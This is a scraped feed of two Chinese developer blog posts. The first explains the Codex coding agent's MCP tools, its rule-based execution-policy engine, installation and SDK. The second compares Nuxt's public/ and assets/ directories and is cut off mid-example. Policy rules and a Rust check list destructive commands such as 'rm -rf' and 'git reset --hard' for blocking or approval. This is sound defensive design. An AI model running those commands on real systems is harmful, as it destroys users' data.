<pre><code class="hljs language-less" lang="less">用户: 帮我创建一个 <span class="hljs-selector-tag">issue</span> 报告这个 <span class="hljs-selector-tag">bug</span>
<span class="hljs-selector-tag">Codex</span>: 好的，我来调用 <span class="hljs-selector-tag">GitHub</span> <span class="hljs-selector-tag">MCP</span> 服务器创建 <span class="hljs-selector-tag">issue</span>...
       <span class="hljs-selector-attr">[调用 mcp__github__create_issue 工具]</span>
       <span class="hljs-selector-tag">Issue</span> 已创建：<span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//github.com/xxx/xxx/issues/123</span>
</code></pre>
<h4 data-id="heading-51">MCP 通信流程</h4>
<pre><code class="hljs language-markdown" lang="markdown">┌─────────────┐     JSON-RPC      ┌─────────────┐
│   Codex     │ ◄──────────────► │  MCP 服务器  │
│  (客户端)   │    over stdio    │  (GitHub)   │
└─────────────┘                   └─────────────┘

<span class="hljs-bullet">1.</span> 初始化握手：交换能力声明
<span class="hljs-bullet">2.</span> 工具列表：获取可用工具
<span class="hljs-bullet">3.</span> 工具调用：执行具体操作
<span class="hljs-bullet">4.</span> 返回结果：获取执行结果
</code></pre>
<h4 data-id="heading-52">支持的传输方式</h4>

























<table><thead><tr><th>传输方式</th><th>适用场景</th><th>示例</th></tr></thead><tbody><tr><td>stdio</td><td>本地进程</td><td>npx 启动的工具</td></tr><tr><td>HTTP</td><td>远程服务</td><td>云端 API</td></tr><tr><td>HTTP + OAuth</td><td>需要认证的服务</td><td>GitHub, Slack</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-53">执行策略：智能的权限管理</h3>
<h4 data-id="heading-54">问题：如何判断命令是否安全？</h4>
<p>不是所有命令都同样危险：</p>
<ul>
<li><code>ls</code> 完全安全</li>
<li><code>npm test</code> 通常安全</li>
<li><code>rm -rf /</code> 绝对危险</li>
<li><code>git push</code> 需要确认</li>
</ul>
<h4 data-id="heading-55">解决方案：执行策略引擎</h4>
<p>Codex 使用基于规则的执行策略系统：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
flowchart TD
    Start["命令: git push origin main"] --&gt; Parse["解析命令 tokens"]
    Parse --&gt; Lookup["查找匹配规则"]

    subgraph Rules["规则库"]
        R1["prefix_rule(['ls'], 'allow')"]
        R2["prefix_rule(['git', 'push'], 'prompt')"]
        R3["prefix_rule(['rm', '-rf'], 'forbidden')"]
    end

    Lookup --&gt; R1
    Lookup --&gt; R2
    Lookup --&gt; R3

    R1 --&gt; Match{"匹配检查"}
    R2 --&gt; Match
    R3 --&gt; Match

    Match --&gt;|"匹配 R2"| Collect["收集匹配结果"]
    Match --&gt;|"无匹配"| Heuristics["启发式检查"]

    Heuristics --&gt;|"安全命令"| AllowH["Decision: Allow"]
    Heuristics --&gt;|"危险命令"| PromptH["Decision: Prompt"]

    Collect --&gt; MaxDecision["选择最严格决策"]

    MaxDecision --&gt; FinalAllow["Allow: 直接执行"]
    MaxDecision --&gt; FinalPrompt["Prompt: 请求用户批准"]
    MaxDecision --&gt; FinalForbid["Forbidden: 拒绝执行"]

    AllowH --&gt; FinalAllow
    PromptH --&gt; FinalPrompt

    FinalPrompt --&gt; UserChoice{"用户选择"}
    UserChoice --&gt;|"批准"| Execute["执行命令"]
    UserChoice --&gt;|"白名单"| Whitelist["添加 allow 规则"]
    UserChoice --&gt;|"拒绝"| Reject["取消执行"]

    Whitelist --&gt; Execute

    style Start fill:#2196F3,color:#fff
    style FinalAllow fill:#4CAF50,color:#fff
    style FinalPrompt fill:#FF9800,color:#fff
    style FinalForbid fill:#F44336,color:#fff
    style Rules fill:#E8F5E9,stroke:#388E3C

</code></pre>
<h4 data-id="heading-56">策略文件格式</h4>
<p>策略文件使用类 Python 的 Starlark 语言：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ~/.codex/policy/default.codexpolicy</span>

<span class="hljs-comment"># 允许常见的安全命令</span>
prefix_rule(
    pattern = [<span class="hljs-string">"ls"</span>],
    decision = <span class="hljs-string">"allow"</span>,
)

prefix_rule(
    pattern = [<span class="hljs-string">"cat"</span>],
    decision = <span class="hljs-string">"allow"</span>,
)

<span class="hljs-comment"># 需要确认的命令</span>
prefix_rule(
    pattern = [<span class="hljs-string">"git"</span>, [<span class="hljs-string">"push"</span>, <span class="hljs-string">"pull"</span>, <span class="hljs-string">"fetch"</span>]],
    decision = <span class="hljs-string">"prompt"</span>,
)

<span class="hljs-comment"># 禁止危险命令</span>
prefix_rule(
    pattern = [<span class="hljs-string">"rm"</span>, <span class="hljs-string">"-rf"</span>],
    decision = <span class="hljs-string">"forbidden"</span>,
)
</code></pre>
<h4 data-id="heading-57">决策优先级</h4>
<p>当多个规则匹配时，采用最严格的决策：</p>
<pre><code class="hljs">forbidden（禁止） &gt; prompt（提示） &gt; allow（允许）
</code></pre>
<h4 data-id="heading-58">内置安全检测</h4>
<p>除了显式规则，Codex 还有内置的启发式安全检测：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 已知的安全命令（27个）</span>
<span class="hljs-keyword">const</span> SAFE_COMMANDS: &amp;[&amp;<span class="hljs-type">str</span>] = &amp;[
    <span class="hljs-string">"cat"</span>, <span class="hljs-string">"echo"</span>, <span class="hljs-string">"ls"</span>, <span class="hljs-string">"pwd"</span>, <span class="hljs-string">"grep"</span>, <span class="hljs-string">"head"</span>, <span class="hljs-string">"tail"</span>,
    <span class="hljs-string">"wc"</span>, <span class="hljs-string">"sort"</span>, <span class="hljs-string">"uniq"</span>, <span class="hljs-string">"diff"</span>, <span class="hljs-string">"file"</span>, <span class="hljs-string">"which"</span>, <span class="hljs-string">"date"</span>,
    <span class="hljs-string">"env"</span>, <span class="hljs-string">"printenv"</span>, <span class="hljs-string">"hostname"</span>, <span class="hljs-string">"uname"</span>, <span class="hljs-string">"whoami"</span>,
    <span class="hljs-comment">// ...</span>
];

<span class="hljs-comment">// 危险命令检测</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">is_dangerous_command</span>(cmd: &amp;[<span class="hljs-type">String</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">bool</span> {
    matches!(cmd,
        [<span class="hljs-string">"rm"</span>, <span class="hljs-string">"-rf"</span>, ..] |
        [<span class="hljs-string">"git"</span>, <span class="hljs-string">"reset"</span>, <span class="hljs-string">"--hard"</span>, ..] |
        [<span class="hljs-string">"sudo"</span>, ..] |
        <span class="hljs-comment">// ...</span>
    )
}
</code></pre>
<h4 data-id="heading-59">动态白名单</h4>
<p>当你批准一个命令后，可以选择"白名单此命令"，Codex 会自动更新策略文件：</p>
<pre><code class="hljs language-starlark" lang="starlark"># 自动添加的规则
prefix_rule(pattern=["npm", "test"], decision="allow")
</code></pre>
<hr/>
<h3 data-id="heading-60">如何使用 Codex</h3>
<h4 data-id="heading-61">安装方式</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 方式 1：通过 npm 安装</span>
npm install -g @openai/codex

<span class="hljs-comment"># 方式 2：通过 Homebrew 安装（macOS）</span>
brew install --cask codex
</code></pre>
<h4 data-id="heading-62">登录认证</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 ChatGPT 账户登录（推荐）</span>
codex login

<span class="hljs-comment"># 或者使用 API Key</span>
<span class="hljs-built_in">export</span> CODEX_API_KEY=sk-xxx
</code></pre>
<h4 data-id="heading-63">基本使用</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动交互式界面</span>
codex

<span class="hljs-comment"># 直接执行任务（非交互式）</span>
codex <span class="hljs-built_in">exec</span> <span class="hljs-string">"帮我写一个快速排序函数"</span>

<span class="hljs-comment"># 在特定目录工作</span>
codex --<span class="hljs-built_in">cd</span> /path/to/project
</code></pre>
<h4 data-id="heading-64">TypeScript SDK 使用</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Codex</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@openai/codex-sdk"</span>;

<span class="hljs-keyword">const</span> codex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Codex</span>();
<span class="hljs-keyword">const</span> thread = codex.<span class="hljs-title function_">startThread</span>({
    <span class="hljs-attr">model</span>: <span class="hljs-string">"gpt-4"</span>,
    <span class="hljs-attr">sandboxMode</span>: <span class="hljs-string">"workspace-write"</span>,
    <span class="hljs-attr">workingDirectory</span>: <span class="hljs-string">"./my-project"</span>
});

<span class="hljs-comment">// 同步模式：等待完成</span>
<span class="hljs-keyword">const</span> turn = <span class="hljs-keyword">await</span> thread.<span class="hljs-title function_">run</span>(<span class="hljs-string">"帮我修复所有的 TypeScript 错误"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(turn.<span class="hljs-property">finalResponse</span>);

<span class="hljs-comment">// 流式模式：实时获取事件</span>
<span class="hljs-keyword">const</span> { events } = <span class="hljs-keyword">await</span> thread.<span class="hljs-title function_">runStreamed</span>(<span class="hljs-string">"运行测试"</span>);
<span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> (<span class="hljs-keyword">const</span> event <span class="hljs-keyword">of</span> events) {
    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">type</span> === <span class="hljs-string">"item.completed"</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"完成:"</span>, event.<span class="hljs-property">item</span>);
    }
}
</code></pre>
<h4 data-id="heading-65">配置文件</h4>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-comment"># ~/.codex/config.toml</span>

<span class="hljs-comment"># 默认模型</span>
<span class="hljs-attr">model</span> = <span class="hljs-string">"gpt-4-turbo"</span>

<span class="hljs-comment"># 沙箱策略</span>
<span class="hljs-attr">sandbox_policy</span> = <span class="hljs-string">"workspace-write"</span>

<span class="hljs-comment"># 审批策略</span>
<span class="hljs-attr">approval_policy</span> = <span class="hljs-string">"on-request"</span>

<span class="hljs-comment"># MCP 服务器配置</span>
<span class="hljs-section">[mcp_servers.github]</span>
<span class="hljs-attr">enabled</span> = <span class="hljs-literal">true</span>
<span class="hljs-section">[mcp_servers.github.transport]</span>
<span class="hljs-attr">type</span> = <span class="hljs-string">"stdio"</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"npx"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"@modelcontextprotocol/server-github"</span>]
</code></pre>
<h3 data-id="heading-66">总结</h3>
<h4 data-id="heading-67">Codex 的设计哲学</h4>
<ol>
<li><strong>安全第一</strong>：多层沙箱、执行策略、用户审批</li>
<li><strong>可扩展性</strong>：工具系统、MCP 协议、插件架构</li>
<li><strong>智能管理</strong>：上下文压缩、记忆持久化、Token 优化</li>
<li><strong>用户体验</strong>：交互式界面、流式输出、断点续传</li>
</ol>
<h4 data-id="heading-68">技术亮点</h4>



































<table><thead><tr><th>特性</th><th>技术实现</th><th>优势</th></tr></thead><tbody><tr><td>性能</td><td>Rust 核心</td><td>接近原生速度</td></tr><tr><td>安全</td><td>多平台沙箱</td><td>系统级隔离</td></tr><tr><td>扩展</td><td>MCP 协议</td><td>开放生态</td></tr><tr><td>智能</td><td>上下文工程</td><td>高效利用模型能力</td></tr><tr><td>体验</td><td>SQ/EQ 异步模式</td><td>流畅的交互</td></tr></tbody></table>
<h4 data-id="heading-69">未来展望</h4>
<p>Codex 代表了 AI 编程助手的一个重要方向：从"建议"走向"执行"，从"对话"走向"协作"。随着 AI 能力的提升和工具生态的完善，我们可以期待更加智能、安全、高效的编程助手。</p>
<hr/>
<h3 data-id="heading-70">附录：关键文件路径速查</h3>













































<table><thead><tr><th>组件</th><th>路径</th></tr></thead><tbody><tr><td>核心引擎</td><td><code>codex-rs/core/src/codex.rs</code></td></tr><tr><td>TUI 界面</td><td><code>codex-rs/tui/src/app.rs</code></td></tr><tr><td>工具系统</td><td><code>codex-rs/core/src/tools/</code></td></tr><tr><td>沙箱实现</td><td><code>codex-rs/core/src/sandboxing/</code></td></tr><tr><td>执行策略</td><td><code>codex-rs/execpolicy/src/</code></td></tr><tr><td>MCP 客户端</td><td><code>codex-rs/rmcp-client/src/</code></td></tr><tr><td>上下文管理</td><td><code>codex-rs/core/src/context_manager/</code></td></tr><tr><td>记忆系统</td><td><code>codex-rs/core/src/message_history.rs</code></td></tr><tr><td>TypeScript SDK</td><td><code>sdk/typescript/src/</code></td></tr></tbody></table>
<hr/>
<ul>
<li>作者【<strong>前端领秀</strong>】一个喜欢探索前端领域AI赋能的开发者，喜欢我的可以关注我，私信我邀请进入技术群，我会时刻分享最新前沿AI技术；</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1736e8fdc0aa4d24b9765b4f9749ba8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56C06IynNjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768537577&amp;x-signature=vIjb9dk8v8jFPxxjcMWQYCT2y%2FE%3D" alt="扫码_搜索联合传播样式-白色版.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[到底是用nuxt的public还是assets？一篇文章开悟]]></title>    <link>https://juejin.cn/post/7592912896591298579</link>    <guid>https://juejin.cn/post/7592912896591298579</guid>    <pubDate>2026-01-09T03:03:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592912896591298579" data-draft-id="7592710766010531850" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="到底是用nuxt的public还是assets？一篇文章开悟"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-09T03:03:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="江湖文人"/> <meta itemprop="url" content="https://juejin.cn/user/3044986347066480"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            到底是用nuxt的public还是assets？一篇文章开悟
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3044986347066480/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    江湖文人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:03:22.000Z" title="Fri Jan 09 2026 03:03:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    22
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">assets</h2>
<blockquote>
<p><code>Nuxt</code>为你的资产提供了两种处理方式。</p>
</blockquote>
<p><code>Nuxt</code>使用两个目录来处理样式表、字体或图片等资产：</p>
<ul>
<li><code>public/</code>目录的内容会直接以服务器根路径的形式提供。</li>
<li><code>assets/</code>目录按惯例包含你希望构建工具（<code>Vite</code>或<code>webpack</code>）处理的所有资产。</li>
</ul>
<h2 data-id="heading-1">公共目录</h2>
<p><code>public/</code>目录用作静态资产的公共服务器，这些资产可以在你的应用定义的<code>URL</code>下公开访问。</p>
<p>你可以通过应用的代码或浏览器使用根<code>URL</code>/来获取<code>public/</code>目录中的文件。</p>
<h3 data-id="heading-2">示例</h3>
<p>例如，引用位于<code>public/img/</code>目录中的图像文件，可通过静态<code>URL</code>/img/nuxt.png访问：</p>
<pre><code class="hljs language-vue" lang="vue">// app.vue
&lt;template&gt;
  &lt;img src="/img/nuxt.png" alt="探索 Nuxt" /&gt;
&lt;/template&gt;
</code></pre>
<h2 data-id="heading-3">资产目录</h2>
<p>Nuxt使用<code>Vite</code>（默认）或<code>webpack</code>来构建和打包你的应用。这些构建工具的主要功能是处理<code>JavaScript</code>文件，但可以通过<code>插件</code>（用于Vite）或<code>加载器</code>（用于webpack）扩展，以处理其他类型的资产，例如样式表、字体或<code>SVG</code>。这一过程主要为了性能或缓存目的转换原始文件（例如样式表压缩或浏览器缓存失败）。</p>
<p>按照惯例，<code>Nuxt</code>使用<code>assets/</code>目录来存储这些文件，但该目录没有自动扫描功能，你可以为它使用任何其他名称。</p>
<p>在应用代码中，可以通过<code>~/assets/</code>路径引用位于<code>assets/</code>目录中的文件。</p>
<h3 data-id="heading-4">示例</h3>
<p>例如，引用一个图像文件，如果构建工具配置为处理此文件扩展名，该文件将被处理：</p>
<pre><code class="hljs language-html" lang="html">// app.vue
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"~/assets/img/nuxt.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"探索 Nuxt"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<blockquote>
<p><code>Nuxt</code>不会以静态<code>URL</code>（如<code>/assets/my-file.png</code>）提供<code>assets/</code>目录中的文件。如果你需要静态<code>URL</code>，请使用<code>public/</code>目录。</p>
</blockquote>
<h2 data-id="heading-5">区别 —— 纠结用哪个可以看这张表</h2>



































<table><thead><tr><th>特性</th><th><code>public/</code>目录</th><th><code>assets/</code>目录</th></tr></thead><tbody><tr><td>目的</td><td><code>静态</code>资源服务器</td><td><code>构建时</code>处理的资源</td></tr><tr><td><code>URL</code>访问</td><td>直接通过根路径<code>/</code>访问</td><td>需通过<code>~/assets/</code>路径引用</td></tr><tr><td>构建处理</td><td>不经过构建工具处理</td><td>经过<code>Vite/webpack</code>处理（压缩、优化等）</td></tr><tr><td>更新方式</td><td>直接替换文件</td><td>构建后生成新文件（带哈希）</td></tr><tr><td>适用场景</td><td>不常更改的资源（如<code>favicon、robots.txt</code>）</td><td>需要构建优化的资源（图片、样式、字体）</td></tr></tbody></table>
<h3 data-id="heading-6">public/</h3>
<pre><code class="hljs language-html" lang="html">// vue
<span class="hljs-comment">&lt;!-- 适用于： --&gt;</span>
<span class="hljs-comment">&lt;!-- 不常更新的静态文件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/favicon.ico"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"网站图标"</span> /&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/brochure.pdf"</span>&gt;</span>下载手册<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
</code></pre>
<h3 data-id="heading-7">assets/</h3>
<pre><code class="hljs language-html" lang="html">// vue
<span class="hljs-comment">&lt;!-- 适用于： --&gt;</span>
<span class="hljs-comment">&lt;!-- 需要优化处理的图片 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"~/assets/images/hero.jpg"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"英雄"</span> /&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 2. 样式文件（SCSS/SASS/LESS） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-keyword">@import</span> <span class="hljs-string">'~/assets/styles/main.scss'</span>;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 3. 字体文件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-keyword">@font-face</span> {
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'CustomFont'</span>;
  <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">'~/assets/fonts/custom.woff2'</span>) <span class="hljs-built_in">format</span>(<span class="hljs-string">'woff2'</span>);
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h2 data-id="heading-8">实战目录结构</h2>
<pre><code class="hljs language-html" lang="html">my-nuxt-app/
├── public/
│   ├── favicon.ico          # 直接通过 /favicon.ico 访问
│   ├── robots.txt          # 直接通过 /robots.txt 访问
│   └── downloads/
│       └── brochure.pdf    # 直接通过 /downloads/brochure.pdf 访问
├── assets/
│   ├── images/
│   │   ├── logo.png        # 构建优化后的图片
│   │   └── background.jpg
│   ├── styles/
│   │   ├── main.scss       # 编译处理的SCSS文件
│   │   └── variables.scss
│   └── fonts/
│       └── custom.woff2    # 字体文件
└── components/
    └── MyComponent.vue
</code></pre>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- 优先使用assets/以获得构建优化  --&gt;
&lt;img src="~/assets/images/product.jpg" alt="产品" /&gt;

&lt;!-- 大尺寸或不需要优化的图片可以放在public --&gt;
